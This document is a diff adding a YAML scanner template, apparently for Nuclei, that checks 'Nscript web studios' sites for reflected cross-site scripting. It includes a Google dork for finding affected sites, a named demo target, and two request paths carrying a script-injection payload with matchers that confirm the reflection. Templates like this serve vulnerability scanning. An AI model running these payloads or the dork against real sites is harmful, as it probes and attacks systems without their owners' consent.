@@ -1,0 +1,26 @@
+id: Nscript XSS
+
+info:
+  name: Nscript web studios XSS vulnerability
+  author: pikpikcu 
+  severity: medium
+  #Category: webapps
+  #Google Dork: "Powered by : Nscript web studios"
+  #Vendor Homepage: nscript.com
+  #Software Link: https://nscript.com/portfolio
+  #Demo Target: http://apjsingapore.com
+
+requests:
+  - method: GET
+    path:
+      - '{{BaseURL}}/bollywood.php?s="><script>alert(document.domain)</script>'
+      - '{{BaseURL}}/products-listing.php?s="><script>alert(document.domain)</script>'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<script>alert(document.domain)</script>"
+        part: body
